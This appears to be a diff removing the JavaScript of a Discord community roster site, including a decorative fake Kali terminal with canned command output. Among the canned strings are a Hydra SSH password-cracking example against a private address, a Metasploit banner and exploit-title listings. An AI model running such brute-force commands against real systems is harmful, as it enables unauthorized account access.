-function profileBanner(member){
-  return (member && (member.banner || member.background)) || CONFIG.profileDefaults.banner;
-}
-
-const validOnly = arr => (arr || []).filter(m => m && m.name && m.name.trim());
-const ALL_POOLS = () => [CONFIG.mainThreats, CONFIG.heirs, CONFIG.bigThreats, CONFIG.godmothers, CONFIG.members];
-const BYID = {};
-ALL_POOLS().forEach(pool => validOnly(pool).forEach(m => { if(!BYID[m.discordId]) BYID[m.discordId] = m; }));
-const ALL = Object.keys(BYID);
-
-function findMemberBySlug(slug){
-  for(const pool of ALL_POOLS()){
-    const found = (pool || []).find(m => m && m.name && slugify(m.name) === slug);
-    if(found) return found;
-  }
-  return null;
-}
-const pathSlug = location.pathname.replace(/^\/+|\/+$/g, '');
-const deepLinkedProfile = pathSlug ? findMemberBySlug(pathSlug) : null;
-
-const HEIR_SLOTS = 2;
-const GODMOTHER_SLOTS = 3;
-const GROUPS = [
-  ['HOF', CONFIG.copy.hofSubtitle, CONFIG.mainThreats, 0],
-  ['Heirs', '', CONFIG.heirs, HEIR_SLOTS],
-  ['Founding Members', CONFIG.copy.bigThreatsSubtitle, CONFIG.bigThreats, 0],
-  ['Godmothers', CONFIG.copy.godmothersSubtitle, CONFIG.godmothers, GODMOTHER_SLOTS],
-  ['Goodkids', CONFIG.copy.membersSubtitle, CONFIG.members, 0],
-];
-
-const CARD_CLS = 'm group/card flex w-[84px] max-[700px]:w-[72px] max-[360px]:w-16 cursor-pointer appearance-none flex-col items-center border-0 bg-transparent p-0 text-center font-[inherit] text-inherit [-webkit-tap-highlight-color:transparent]';
-const AV_CLS = 'av offline relative my-[9px] mb-2.5 h-16 w-16 flex-none max-[700px]:h-14 max-[700px]:w-14 max-[360px]:h-[50px] max-[360px]:w-[50px]';
-const AV_IMG_CLS = 'a block h-full w-full rounded-full bg-[#1a070a] object-cover shadow-[0_0_14px_rgba(255,36,56,.24)] transition-[box-shadow,transform,opacity] duration-[350ms] group-hover/card:scale-105 group-hover/card:shadow-[0_0_24px_rgba(255,36,56,.55)]';
-const DOT_CLS = 's absolute -bottom-px -right-px z-[2] h-4 w-4 rounded-full border-[3px] border-black';
-const NM_CLS = 'nm max-w-full truncate text-[11.5px] text-blood-ok [text-shadow:0_0_4px_#000,0_0_8px_rgba(255,36,56,.4)] transition-colors duration-300 group-hover/card:text-blood';
-
-function cardHTML(m){
-  const id = m.discordId;
-  return '<button class="' + CARD_CLS + '" type="button" data-id="' + esc(id) + '" aria-label="' + esc(m.name) + ' profile">'
-    + '<span class="' + AV_CLS + '"><img class="' + AV_IMG_CLS + '" src="' + def(id) + '" alt="" loading="lazy" referrerpolicy="no-referrer"><span class="' + DOT_CLS + '"></span></span>'
-    + '<span class="' + NM_CLS + '">' + esc(m.name) + '</span></button>';
-}
-
-function placeholderHTML(){
-  return '<div class="m m-empty pointer-events-none flex w-[84px] max-[700px]:w-[72px] max-[360px]:w-16 flex-col items-center" aria-hidden="true">'
-    + '<span class="av relative my-[9px] mb-2.5 grid h-16 w-16 flex-none place-items-center rounded-full border border-dashed border-blood/30 bg-blood/[.03] max-[700px]:h-14 max-[700px]:w-14 max-[360px]:h-[50px] max-[360px]:w-[50px]"><span class="q text-xl text-blood-dim [text-shadow:0_0_8px_rgba(255,36,56,.3)]">?</span></span>'
-    + '<span class="nm max-w-full truncate text-[11.5px] italic text-blood-dim">empty</span></div>';
-}
-
-function cardsHTML(list, slots){
-  const items = [], blanks = [];
-  (list || []).forEach(m => {
-    if(m && m.name && String(m.name).trim()) items.push(m);
-    else blanks.push(m);
-  });
-  const empty = Math.max(0, (slots || 0) - items.length, blanks.length);
-  return items.map(cardHTML).concat(Array.from({ length: empty }, placeholderHTML))
-    .map((html, i) => html.replace(/^<([a-z][\w-]*)/i, '<$1 style="--i:' + i + '"'))
-    .join('');
-}
-
-function sectionHTML(id, title, list, slots){
-  return '<section class="reveal w-full" id="' + id + '">'
-    + '<div class="sec-title">' + esc(title) + '</div>'
-    + '<div class="row flex flex-wrap items-start justify-center gap-x-[22px] gap-y-[26px] max-[700px]:gap-x-3 max-[700px]:gap-y-5">'
-    + cardsHTML(list, slots) + '</div></section>';
-}
-
-const groupAnchor = gi => 'gang-' + GROUPS[gi][0].toLowerCase().replace(/[^a-z0-9]+/g, '-');
-
-const rosterEl = document.getElementById('roster');
-rosterEl.innerHTML = GROUPS
-  .map(([title, , list, slots], gi) => sectionHTML(groupAnchor(gi), title, list, slots))
-  .join('');
-
-const GANGNEM_CARD_W = 300;
-const GANGNEM_GAP = 14;
-
-const inviteCode = srv => {
-  const raw = String((srv && (srv.invite || srv.code || srv.url)) || '').trim();
-  if(!raw) return '';
-  return raw
-    .replace(/^https?:\/\/(?:www\.)?(?:discord\.gg|discord(?:app)?\.com\/invite)\//i, '')
-    .replace(/[?#].*$/, '')
-    .replace(/\/+$/, '');
-};
-
-const serverCount = n => typeof n === 'number' && isFinite(n) && n >= 0 ? n.toLocaleString('en-US') : '\u00b7\u00b7\u00b7';
-
-function serverCard(srv, i){
-  const name = srv.name || 'server';
-  const code = inviteCode(srv);
-  const href = srv.url || (code ? 'https://discord.gg/' + code : '');
-  const icon = srv.icon
-    ? '<img src="' + esc(srv.icon) + '" alt="" loading="lazy" referrerpolicy="no-referrer">'
-    : '<span class="g-ico-mark" aria-hidden="true">' + esc(name.replace(/[^a-z0-9]/gi, '').slice(0, 3).toLowerCase()) + '</span>';
-  const inner = '<span class="g-ico">' + icon + '</span>'
-    + '<span class="g-body"><span class="g-name">' + esc(name) + '</span>'
-    + '<span class="g-meta"><i class="g-live' + (srv.online ? '' : ' off') + '" aria-hidden="true"></i>'
-    + '<span class="g-count"><b class="g-online">' + serverCount(srv.online) + '</b> online &middot; <b class="g-total">' + serverCount(srv.members) + '</b> members</span></span></span>'
-    + '<span class="g-go" aria-hidden="true">&#8594;</span>';
-  return href
-    ? '<a class="gcard" data-srv="' + i + '" href="' + esc(href) + '" target="_blank" rel="noopener noreferrer" aria-label="' + esc(name) + ' on Discord">' + inner + '</a>'
-    : '<span class="gcard" data-srv="' + i + '">' + inner + '</span>';
-}
-
-function buildGangnem(){
-  const servers = (CONFIG.gangnem || []).filter(Boolean);
-  const cards = servers.map(serverCard);
-  const per = Math.max(1, Math.ceil(1120 / Math.max(1, cards.length * (GANGNEM_CARD_W + GANGNEM_GAP))));
-  const set = cards.join('').repeat(per);
-  const row = document.getElementById('gangnemRow');
-  row.style.setProperty('--dur', Math.max(18, Math.round((cards.length * per * (GANGNEM_CARD_W + GANGNEM_GAP)) / 62)) + 's');
-  row.innerHTML = '<div class="marquee-inner"><div class="m-set">' + set + '</div><div class="m-set" aria-hidden="true">' + set + '</div></div>';
-}
-
-function paintGangnem(){
-  const servers = CONFIG.gangnem || [];
-  document.querySelectorAll('#gangnemRow [data-srv]').forEach(el => {
-    const srv = servers[Number(el.dataset.srv)];
-    if(!srv) return;
-    const name = srv.name || 'server';
-    const nameEl = el.querySelector('.g-name');
-    const online = el.querySelector('.g-online');
-    const total = el.querySelector('.g-total');
-    const live = el.querySelector('.g-live');
-    if(nameEl) nameEl.textContent = name;
-    if(online) online.textContent = serverCount(srv.online);
-    if(total) total.textContent = serverCount(srv.members);
-    if(live) live.classList.toggle('off', !srv.online);
-    const ico = el.querySelector('.g-ico');
-    if(ico){
-      const img = ico.querySelector('img');
-      if(srv.icon){
-        if(!img) ico.innerHTML = '<img src="' + esc(srv.icon) + '" alt="" loading="lazy" referrerpolicy="no-referrer">';
-        else if(img.getAttribute('src') !== srv.icon) img.src = srv.icon;
-      }else if(!img){
-        const mark = ico.querySelector('.g-ico-mark');
-        if(mark) mark.textContent = name.replace(/[^a-z0-9]/gi, '').slice(0, 3).toLowerCase();
-      }
-    }
-    if(el.tagName === 'A'){
-      if(srv.url && el.getAttribute('href') !== srv.url) el.setAttribute('href', srv.url);
-      el.setAttribute('aria-label', name + ' on Discord');
-    }
-  });
-}
-
-const serverIcon = g => g && g.id && g.icon
-  ? 'https://cdn.discordapp.com/icons/' + g.id + '/' + g.icon + (/^a_/.test(g.icon) ? '.gif' : '.png') + '?size=128'
-  : '';
-
-async function syncServer(srv){
-  const code = inviteCode(srv);
-  if(!code) return;
-  try{
-    const res = await fetch('https://discord.com/api/v10/invites/' + encodeURIComponent(code) + '?with_counts=true', { cache: 'no-store' });
-    if(!res.ok) return;
-    const j = await res.json();
-    if(typeof j.approximate_presence_count === 'number') srv.online = j.approximate_presence_count;
-    if(typeof j.approximate_member_count === 'number') srv.members = j.approximate_member_count;
-    const g = j.guild || {};
-    if(g.name) srv.name = g.name;
-    const icon = serverIcon(g);
-    if(icon) srv.icon = icon;
-    if(!srv.url && j.code) srv.url = 'https://discord.gg/' + j.code;
-  }catch(e){}
-}
-
-async function refreshGangnem(){
-  await Promise.all((CONFIG.gangnem || []).filter(s => s && inviteCode(s)).map(syncServer));
-  paintGangnem();
-}
-
-buildGangnem();
-paintGangnem();
-refreshGangnem();
-setInterval(() => { if(document.visibilityState === 'visible') refreshGangnem(); }, 60000);
-
-const revealRoot = document.getElementById('shell');
-const revealTargets = Array.from(revealRoot.querySelectorAll('.reveal'));
-
-function initScrollReveal(){
-  if(reduceMotion || !('IntersectionObserver' in window)){
-    revealTargets.forEach(el => el.classList.add('in'));
-    return;
-  }
-  function syncSides(){
-    const rootTop = revealRoot.getBoundingClientRect().top;
-    for(const el of revealTargets){
-      if(el.classList.contains('in')) continue;
-      el.dataset.side = el.getBoundingClientRect().top < rootTop ? 'top' : 'bottom';
-    }
-  }
-  let sideFrame = 0;
-  revealRoot.addEventListener('scroll', () => {
-    if(sideFrame) return;
-    sideFrame = requestAnimationFrame(() => { sideFrame = 0; syncSides(); });
-  }, { passive: true });
-
-  const io = new IntersectionObserver(entries => {
-    for(const entry of entries){
-      const el = entry.target;
-      const shown = entry.isIntersecting;
-      el.inert = !shown;
-      el.classList.toggle('in', shown);
-    }
-    syncSides();
-  }, { root: revealRoot, rootMargin: '0px 0px -7% 0px', threshold: 0 });
-  revealTargets.forEach(el => io.observe(el));
-  syncSides();
-}
-
-const TERM = CONFIG.terminal;
-const termSection = document.getElementById('term');
-const termOut = document.getElementById('termOut');
-const termForm = document.getElementById('termForm');
-const termInput = document.getElementById('termInput');
-const TERM_HISTORY = [];
-let termHistIndex = 0;
-
-const FETCH_ART = `     s                      .x+=:.
-    :8      .--~*teu.      z\`    ^%
-   .88     dF     988Nx       .   <k
-  :888ooo d888b   \`8888>    .@8Ned8"
--*8888888 ?8888>  98888F  .@^%8888"
-  8888     "**"  x88888~ x88:  \`)8b.
-  8888          d8888*\`  8888N=*8888
-  8888        z8**"\`   :  %8"    R88
- .8888Lu=   :?.....  ..F   @8Wou 9%
- ^%888*    <""888888888~ .888888P\`
-   'Y"     8:  "888888*  \`   ^"F
-           ""    "**"\``;
-
-// Server clock: read the host's own Date header so the terminal shows the server's time (UTC).
-// Falls back to the visitor's clock if the request fails (e.g. opened from a local file).
-const SERVER_BOOT = Date.parse('2026-11-01T00:00:00Z'); // when the "box" came up; edit to taste
-let serverOffset = 0;
-const serverNow = () => Date.now() + serverOffset;
-(function syncServerClock(){
-  try{
-    const t0 = Date.now();
-    fetch(location.href, { method: 'HEAD', cache: 'no-store' }).then(res => {
-      const h = res.headers.get('date');
-      const srv = h ? Date.parse(h) : NaN;
-      if(isFinite(srv)) serverOffset = srv - (t0 + Date.now()) / 2;
-    }).catch(() => {});
-  }catch(e){}
-})();
-const upSecs = () => Math.max(0, Math.floor((serverNow() - SERVER_BOOT) / 1000));
-const plural = (n, w) => n + ' ' + w + (n === 1 ? '' : 's');
-function uptimeLong(){
-  const t = upSecs();
-  return plural(Math.floor(t / 86400), 'day') + ', ' + plural(Math.floor(t % 86400 / 3600), 'hour') + ', ' + plural(Math.floor(t % 3600 / 60), 'min');
-}
-function uptimeShort(){
-  const t = upSecs(), d = Math.floor(t / 86400), h = Math.floor(t % 86400 / 3600), m = Math.floor(t % 3600 / 60);
-  return (d ? plural(d, 'day') + ',  ' : '') + h + ':' + String(m).padStart(2, '0');
-}
-
-const FETCH_SPECS = [
-  ['OS', 'Kali GNU/Linux Rolling x86_64'],
-  ['Host', 'ASUS ROG Zephyrus G14 (GA402RJ)'],
-  ['Board', 'ASUSTeK COMPUTER INC. GA402RJ'],
-  ['BIOS', 'American Megatrends GA402RJ.325'],
-  ['Kernel', '6.9.7-amd64'],
-  ['Uptime', () => uptimeLong()],
-  ['Packages', '2894 (dpkg), 12 (snap)'],
-  ['Shell', 'zsh 5.9'],
-  ['Resolution', '2560x1600 @ 120Hz'],
-  ['DE', 'Xfce 4.18'],
-  ['WM', 'Xfwm4'],
-  ['WM Theme', 'Kali-Dark'],
-  ['Theme', 'Kali-Dark [GTK3]'],
-  ['Icons', 'Flat-Remix-Red-Dark [GTK3]'],
-  ['Terminal', 'qterminal'],
-  ['CPU', 'AMD Ryzen 9 6900HS (16) @ 4.906GHz'],
-  ['GPU', 'AMD Radeon RX 6700S'],
-  ['Memory', '6349MiB / 15361MiB'],
-  ['Disk', '187G / 468G (43%) NVMe'],
-  ['Battery', '82% [Discharging]'],
-];
-const FETCH_SWATCH = ['#ff2438', '#ff6b78', '#b33a46', '#f4f4f4', '#6b4046', '#4a1a20', '#2b0509'];
-
-
-function termBox(){
-  const box = document.createElement('div');
-  box.className = 'term-run';
-  termOut.appendChild(box);
-  return box;
-}
-
-function termPrompt(parent){
-  const line = document.createElement('div');
-  line.className = 'flex flex-wrap items-baseline gap-x-1.5' + (parent.childElementCount ? ' mt-3' : '');
-  const shell = document.createElement('span');
-  shell.className = 'select-none';
-  const user = document.createElement('span');
-  user.className = 'text-blood-ok';
-  user.textContent = TERM.user + '@' + TERM.host;
-  const colon = document.createElement('span');
-  colon.className = 'text-blood-ash';
-  colon.textContent = ':';
-  const tilde = document.createElement('span');
-  tilde.className = 'text-blood';
-  tilde.textContent = '~';
-  const dollar = document.createElement('span');
-  dollar.className = 'text-blood-ash';
-  dollar.textContent = '$';
-  shell.append(user, colon, tilde, dollar);
-  const text = document.createElement('span');
-  text.className = 'text-blood-soft';
-  line.append(shell, text);
-  parent.appendChild(line);
-  return text;
-}
-
-function termWrite(parent, lines){
-  for(const line of lines || []){
-    const row = document.createElement('div');
-    row.className = 'text-blood-soft';
-    const mark = document.createElement('span');
-    mark.className = 'text-blood-dim';
-    mark.textContent = '> ';
-    const text = document.createElement('span');
-    text.textContent = line;
-    row.append(mark, text);
-    parent.appendChild(row);
-  }
-}
-
-function termPrint(parent, lines){
-  for(const line of lines || []){
-    const row = document.createElement('div');
-    row.className = 'text-blood-soft';
-    row.textContent = line === '' ? '\u00a0' : line;
-    parent.appendChild(row);
-  }
-}
-
-function termBlock(parent, el){
-  el.classList.add('term-in');
-  parent.appendChild(el);
-}
-
-function termFetch(){
-  const wrap = document.createElement('div');
-  wrap.className = 'mt-2 flex items-start gap-5 max-[560px]:gap-0';
-  const art = document.createElement('pre');
-  art.className = 'm-0 hidden flex-none select-none whitespace-pre text-[12px] leading-[1.16] text-blood min-[720px]:block';
-  art.setAttribute('aria-hidden', 'true');
-  art.textContent = FETCH_ART;
-  const info = document.createElement('div');
-  info.className = 'min-w-0 text-[12px] leading-[1.55] max-[700px]:text-[11.5px]';
-  const title = document.createElement('div');
-  title.className = 'text-blood';
-  title.textContent = TERM.user + '@' + TERM.host;
-  const rule = document.createElement('div');
-  rule.className = 'text-blood-dim';
-  rule.textContent = '-'.repeat((TERM.user + '@' + TERM.host).length);
-  info.append(title, rule);
-  for(const [key, value] of FETCH_SPECS){
-    const row = document.createElement('div');
-    row.className = 'break-words';
-    const k = document.createElement('span');
-    k.className = 'text-blood';
-    k.textContent = key + ': ';
-    const v = document.createElement('span');
-    v.className = 'text-blood-soft';
-    v.textContent = typeof value === 'function' ? value() : value;
-    row.append(k, v);
-    info.appendChild(row);
-  }
-  const swatch = document.createElement('div');
-  swatch.className = 'mt-2 flex gap-1';
-  swatch.setAttribute('aria-hidden', 'true');
-  for(const color of FETCH_SWATCH){
-    const chip = document.createElement('i');
-    chip.className = 'h-3 w-4 rounded-[1px]';
-    chip.style.background = color;
-    swatch.appendChild(chip);
-  }
-  info.appendChild(swatch);
-  wrap.append(art, info);
-  return wrap;
-}
-
-const OS_RELEASE = [
-  'PRETTY_NAME="Kali GNU/Linux Rolling"',
-  'NAME="Kali GNU/Linux"',
-  'VERSION_ID="2026.1"',
-  'VERSION="2026.1 (kali-rolling)"',
-  'VERSION_CODENAME=kali-rolling',
-  'ID=kali',
-  'ID_LIKE=debian',
-  'ANSI_COLOR="1;31"',
-  'HOME_URL="https://www.kali.org/"',
-  'SUPPORT_URL="https://forums.kali.org/"',
-  'BUG_REPORT_URL="https://bugs.kali.org/"',
-];
-
-const LS_SHORT = ['.bashrc  .zshrc  about.txt  reason.txt  roster.txt  status.txt  tools/'];
-
-const LS_LONG = [
-  'total 48',
-  'drwxr-xr-x  8 t2s t2s 4096 Nov 16 09:41 .',
-  'drwxr-xr-x 12 t2s t2s 4096 Nov 16 08:04 ..',
-  '-rw-r--r--  1 t2s t2s  108 Nov 14 22:07 about.txt',
-  '-rw-r--r--  1 t2s t2s  204 Nov 15 03:18 reason.txt',
-  '-rw-r--r--  1 t2s t2s  186 Nov 15 03:18 roster.txt',
-  '-rw-r--r--  1 t2s t2s   71 Nov 15 03:18 status.txt',
-  'drwxr-xr-x  6 t2s t2s 4096 Nov 16 09:12 tools',
-];
-
-const IP_ADDR = [
-  '1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000',
-  '    inet 127.0.0.1/8 scope host lo',
-  '       valid_lft forever preferred_lft forever',
-  '2: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000',
-  '    link/ether 4c:ed:fb:2a:71:0d brd ff:ff:ff:ff:ff:ff',
-  '    inet 192.168.1.42/24 brd 192.168.1.255 scope global dynamic wlan0',
-  '       valid_lft 84113sec preferred_lft 84113sec',
-];
-
-const IP_ROUTE = [
-  'default via 192.168.1.1 dev wlan0 proto dhcp src 192.168.1.42 metric 600',
-  '192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.42 metric 600',
-];
-
-const IFCONFIG = [
-  'wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500',
-  '        inet 192.168.1.42  netmask 255.255.255.0  broadcast 192.168.1.255',
-  '        ether 4c:ed:fb:2a:71:0d  txqueuelen 1000  (Ethernet)',
-  '        RX packets 184223  bytes 214913882 (204.9 MiB)',
-  '        TX packets 91240  bytes 12883104 (12.2 MiB)',
-];
-
-const PS_AUX = [
-  'USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND',
-  'root           1  0.0  0.1 168712 12904 ?        Ss   08:12   0:04 /sbin/init',
-  'root         612  0.0  0.2 224512 17640 ?        Ssl  08:12   0:00 /usr/sbin/NetworkManager',
-  'root         818  0.0  0.1  12840  8320 ?        Ss   08:12   0:00 /usr/sbin/sshd',
-  't2s         1187  0.1  0.4 812344 38120 tty1     Sl+  08:14   0:07 -zsh',
-  't2s         2244  0.0  0.0  12108  4104 tty1     R+   09:41   0:00 ps aux',
-];
-
-const SS_TULNP = [
-  'Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process',
-  'udp   UNCONN 0      0          0.0.0.0:68         0.0.0.0:*',
-  'tcp   LISTEN 0      128        0.0.0.0:22         0.0.0.0:*',
-  'tcp   LISTEN 0      4096     127.0.0.1:631        0.0.0.0:*',
-  'tcp   LISTEN 0      128        0.0.0.0:8080       0.0.0.0:*',
-];
-
-const DF_H = [
-  'Filesystem      Size  Used Avail Use% Mounted on',
-  'udev            7.4G     0  7.4G   0% /dev',
-  '/dev/nvme0n1p2  468G  187G  257G  43% /',
-  '/dev/nvme0n1p1  511M   62M  450M  13% /boot/efi',
-  'tmpfs           1.5G  2.1M  1.5G   1% /run/user/1000',
-];
-
-const FREE_H = [
-  '               total        used        free      shared  buff/cache   available',
-  'Mem:            15Gi       6.2Gi       3.1Gi       412Mi       6.1Gi       8.9Gi',
-  'Swap:          7.4Gi       512Mi       6.9Gi',
-];
-
-const APT_USAGE = [
-  'apt 2.9.8 (amd64)',
-  'Usage: apt [options] command',
-  'install \u00b7 update \u00b7 upgrade \u00b7 search \u00b7 show',
-];
-
-const APT_UPDATE = [
-  'Hit:1 http://kali.download/kali kali-rolling InRelease',
-  'Get:2 http://kali.download/kali kali-rolling/main amd64 Packages [19.4 MB]',
-  'Get:3 http://kali.download/kali kali-rolling/non-free amd64 Packages [201 kB]',
-  'Fetched 19.6 MB in 3s (6,412 kB/s)',
-  'Reading package lists... Done',
-];
-
-const aptInstall = pkg => [
-  'Reading package lists... Done',
-  'Building dependency tree... Done',
-  'Reading state information... Done',
-  pkg + ' is already the newest version (2026.1).',
-  '0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.',
-];
-
-const HYDRA_USAGE = [
-  'Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak',
-  'Hydra is a parallelized login cracker with support for 50+ protocols.',
-  'Syntax: hydra [[-l LOGIN|-L FILE] [-p PASS|-P FILE]] service://server[:PORT][/OPT]',
-  'Example: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.14.7',
-];
-
-const MSF_BANNER = [
-  '       =[ metasploit v6.4.12-dev ]',
-  '+ -- --=[ 2476 exploits - 1274 auxiliary - 421 post ]',
-  '+ -- --=[ 1467 payloads - 47 encoders - 11 nops ]',
-  '+ -- --=[ 9 evasion ]',
-  '',
-  '[!] console unavailable in this shell \u2014 run it on the box.',
-];
-
-const searchsploit = term => [
-  '---------------------------------------------- ---------------------------------',
-  ' Exploit Title                                |  Path',
-  '---------------------------------------------- ---------------------------------',
-  'Apache 2.4.49 - Path Traversal                | linux/remote/50383.py',
-  'Linux Kernel 6.9 - nf_tables UAF              | linux/local/50999.c',
-  'OpenSSH 8.9p1 - Pre-Auth Enumeration          | linux/remote/45233.py',
-  '---------------------------------------------- ---------------------------------',
-  'Shellcodes: No Results' + (term ? '  (search: ' + term + ')' : ''),
-];
-
-const nmap = host => [
-  'Starting Nmap 7.94SVN ( https://nmap.org ) at ' + new Date(serverNow()).toLocaleString('en-GB', { timeZone: 'UTC' }) + ' UTC',
-  'Nmap scan report for ' + host,
-  'Host is up (0.018s latency).',
-  'Not shown: 996 closed tcp ports (reset)',
-  'PORT     STATE SERVICE VERSION',
-  '22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)',
-  '80/tcp   open  http    nginx 1.18.0',
-  '443/tcp  open  ssl/http nginx 1.18.0',
-  '8080/tcp open  http-proxy Squid 5.7',
-  'Nmap done: 1 IP address (1 host up) scanned in 7.21 seconds',
-];
-
-const ping = host => [
-  'PING ' + host + ' (' + host + ') 56(84) bytes of data.',
-  '64 bytes from ' + host + ': icmp_seq=1 ttl=57 time=11.4 ms',
-  '64 bytes from ' + host + ': icmp_seq=2 ttl=57 time=10.9 ms',
-  '64 bytes from ' + host + ': icmp_seq=3 ttl=57 time=11.7 ms',
-  '64 bytes from ' + host + ': icmp_seq=4 ttl=57 time=11.2 ms',
-  '',
-  '--- ' + host + ' ping statistics ---',
-  '4 packets transmitted, 4 received, 0% packet loss, time 3004ms',
-  'rtt min/avg/max/mdev = 10.902/11.302/11.741/0.318 ms',
-];
-
-const TERM_FILES = {
-  'status.txt': () => [TERM.status],
-  'about.txt': () => TERM.about,
-  'roster.txt': () => TERM.roster,
-  'reason.txt': () => TERM.roster,
-  '/etc/os-release': () => OS_RELEASE,
-  '/etc/hostname': () => [TERM.host],
-};
-
-function termRun(raw){
-  const cmd = String(raw == null ? '' : raw).trim();
-  const box = termBox();
-  termPrompt(box).textContent = cmd;
-  if(!cmd) return;
-
-  TERM_HISTORY.push(cmd);
-  termHistIndex = TERM_HISTORY.length;
-
-  const parts = cmd.split(/\s+/);
-  const name = parts[0].toLowerCase();
-  const arg = (parts[1] || '').toLowerCase();
-  const rest = parts.slice(1).join(' ');
-  const targets = parts.slice(1).filter(p => p.charAt(0) !== '-');
-  const target = targets.length ? targets[targets.length - 1] : '';
-
-  switch(name){
-    case 'help':
-      termWrite(box, [
-        'available commands',
-        '  roster:  about \u00b7 reason \u00b7 status',
-        '  kali:    nmap <host> \u00b7 ping <host> \u00b7 hydra \u00b7 msfconsole \u00b7 searchsploit \u00b7 apt',
-        '  system:  neofetch \u00b7 whoami \u00b7 id \u00b7 uname -a \u00b7 hostname \u00b7 pwd \u00b7 date \u00b7 uptime',
-        '  network: ip a \u00b7 ifconfig \u00b7 ss -tulnp \u00b7 netstat',
-        '  box:     ps aux \u00b7 df -h \u00b7 free -h \u00b7 ls -la \u00b7 history \u00b7 echo',
-        '  files:   cat <file> \u2014 status.txt \u00b7 about.txt \u00b7 roster.txt',
-        '                        /etc/os-release \u00b7 /etc/hostname',
-        '  clear    wipe the screen',
-      ]);
-      break;
-    case 'neofetch':
-      termBlock(box, termFetch());
-      break;
-    case 'about':
-      termWrite(box, TERM.about);
-      break;
-    case 'roster':
-    case 'reason':
-      termWrite(box, TERM.roster);
-      break;
-    case 'status':
-      termWrite(box, [TERM.status]);
-      break;
-    case 'clear':
-      termOut.textContent = '';
-      break;
-    case 'sudo':
-      termPrint(box, ['sudo: ' + TERM.user + ' is not in the sudoers file.  This incident will be reported.']);
-      break;
-    case 'su':
-      termPrint(box, ['Password:', 'su: Authentication failure']);
-      break;
-
-    case 'whoami':
-      termPrint(box, [TERM.user]);
-      break;
-    case 'id':
-      termPrint(box, ['uid=1000(' + TERM.user + ') gid=1000(' + TERM.user + ') groups=1000(' + TERM.user + '),27(sudo),100(users)']);
-      break;
-    case 'pwd':
-      termPrint(box, ['/home/' + TERM.user]);
-      break;
-    case 'hostname':
-      termPrint(box, [TERM.host]);
-      break;
-    case 'date': {
-      const d = new Date(serverNow());
-      const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
-      const mons = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
-      termPrint(box, [days[d.getUTCDay()] + ' ' + mons[d.getUTCMonth()] + ' ' + d.getUTCDate() + ' ' + d.toISOString().slice(11, 19) + ' UTC ' + d.getUTCFullYear()]);
-      break;
-    }
-    case 'uptime':
-      termPrint(box, [' ' + new Date(serverNow()).toISOString().slice(11, 19) + ' up ' + uptimeShort() + ',  1 user,  load average: 0.42, 0.31, 0.27']);
-      break;
-    case 'uname':
-      if(arg === '-a' || arg === '--all'){
-        termPrint(box, ['Linux caliber 6.9.7-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.9.7-1kali1 (2024-06-25) x86_64 GNU/Linux']);
-      }else if(arg === '-r' || arg === '--kernel-release'){
-        termPrint(box, ['6.9.7-amd64']);
-      }else{
-        termPrint(box, ['Linux']);
-      }
-      break;
-    case 'ls':
-    case 'dir':
-      if(arg === '-l' || arg === '-la' || arg === '-al' || arg === '-lh') termPrint(box, LS_LONG);
-      else termPrint(box, LS_SHORT);
-      break;
-    case 'cat': {
-      const file = TERM_FILES[arg];
-      if(file) termPrint(box, file());
-      else termPrint(box, ['cat: ' + (arg || '') + ': No such file or directory']);
-      break;
-    }
-    case 'history':
-      termPrint(box, TERM_HISTORY.map((c, i) => String(i + 1).padStart(4) + '  ' + c));
-      break;
-    case 'echo':
-      termPrint(box, [rest]);
-      break;
-    case 'exit':
-    case 'logout':
-      termPrint(box, ['logout', 'Connection to ' + TERM.host + ' closed.']);
-      break;
-
-    case 'nmap':
-      termPrint(box, nmap(target || '10.10.14.7'));
-      break;
-    case 'ping':
-      termPrint(box, ping(target || '1.1.1.1'));
-      break;
-    case 'hydra':
-      termPrint(box, HYDRA_USAGE);
-      break;
-    case 'msfconsole':
-    case 'msf':
-      termPrint(box, MSF_BANNER);
-      break;
-    case 'searchsploit':
-      termPrint(box, searchsploit(rest));
-      break;
-    case 'apt':
-    case 'apt-get': {
-      const sub = (parts[1] || '').toLowerCase();
-      if(sub === 'update') termPrint(box, APT_UPDATE);
-      else if(sub === 'install' || sub === 'upgrade' || sub === 'full-upgrade' || sub === 'reinstall')
-        termPrint(box, aptInstall(parts[2] || 'kali-linux-core'));
-      else if(sub === 'search')
-        termPrint(box, ['nmap - Network exploration tool and security scanner', 'hydra - Very fast network logon cracker']);
-      else if(!sub) termPrint(box, APT_USAGE);
-      else termPrint(box, ['E: Invalid operation ' + sub]);
-      break;
-    }
-    case 'ip':
-      if(arg === 'r' || arg === 'ro' || arg === 'route') termPrint(box, IP_ROUTE);
-      else if(!arg || arg === 'a' || arg === 'addr' || arg === 'address' || arg === 'show') termPrint(box, IP_ADDR);
-      else termPrint(box, ['Object "' + arg + '" is unknown, try "ip help".']);
-      break;
-    case 'ifconfig':
-      termPrint(box, IFCONFIG);
-      break;
-    case 'ps':
-      termPrint(box, PS_AUX);
-      break;
-    case 'ss':
-    case 'netstat':
-      termPrint(box, SS_TULNP);
-      break;
-    case 'df':
-      termPrint(box, DF_H);
-      break;
-    case 'free':
-      termPrint(box, FREE_H);
-      break;
-    default:
-      termPrint(box, ['bash: ' + name + ': command not found']);
-  }
-  termScroll(true);
-}
-
-function termScroll(smooth){
-  const root = revealRoot.getBoundingClientRect();
-  const box = termSection.getBoundingClientRect();
-  if(box.bottom < root.top || box.top > root.bottom) return;
-  termInput.scrollIntoView({ block: 'nearest', behavior: smooth && !reduceMotion ? 'smooth' : 'auto' });
-}
-
-termForm.addEventListener('submit', e => {
-  e.preventDefault();
-  const raw = termInput.value;
